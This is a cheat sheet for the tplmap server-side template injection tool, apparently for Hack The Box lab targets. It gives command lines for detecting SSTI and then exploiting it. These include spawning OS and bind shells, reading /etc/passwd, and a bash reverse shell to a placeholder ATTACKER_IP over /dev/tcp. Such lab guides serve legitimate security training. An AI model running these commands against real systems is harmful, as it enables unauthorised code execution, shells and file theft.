# tplmap

## Purpose
Server-Side Template Injection (SSTI) detection and exploitation tool. Automatically identifies template engines (Jinja2, Mako, Twig, Smarty, etc.) and exploits injection points for code execution.

## Installation
```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

## Quick Start
```bash
# Test a URL parameter for SSTI
python3 tplmap.py -u 'http://target.htb/page?name=test'

# Test with POST data
python3 tplmap.py -u 'http://target.htb/page' -d 'name=test'

# Get an OS shell on confirmed SSTI
python3 tplmap.py -u 'http://target.htb/page?name=test' --os-shell

# Execute a single command
python3 tplmap.py -u 'http://target.htb/page?name=test' --os-cmd 'id'

# Force a specific template engine
python3 tplmap.py -u 'http://target.htb/page?name=test' -e jinja2
```

## Common Patterns
```bash
# Test with cookies or custom headers
python3 tplmap.py -u 'http://target.htb/page?name=test' \
  -c 'session=abc123' -H 'X-Custom: value'

# Reverse shell via SSTI
python3 tplmap.py -u 'http://target.htb/page?name=test' \
  --os-cmd 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'

# Read a file through SSTI
python3 tplmap.py -u 'http://target.htb/page?name=test' \
  --os-cmd 'cat /etc/passwd'

# Bind shell on target
python3 tplmap.py -u 'http://target.htb/page?name=test' --bind-shell 4444
```

## HTB Usage
- Use when you spot template rendering in web apps (Flask, Jinja2, Twig, etc.)
- Test any user input that gets reflected in rendered pages
- Quick way to confirm and exploit SSTI without manual payload crafting
- Falls back to blind detection when output is not reflected
- Combine with manual payloads like `{{7*7}}` or `${7*7}` for initial detection
- If tplmap fails, try manual SSTI payloads from PayloadsAllTheThings
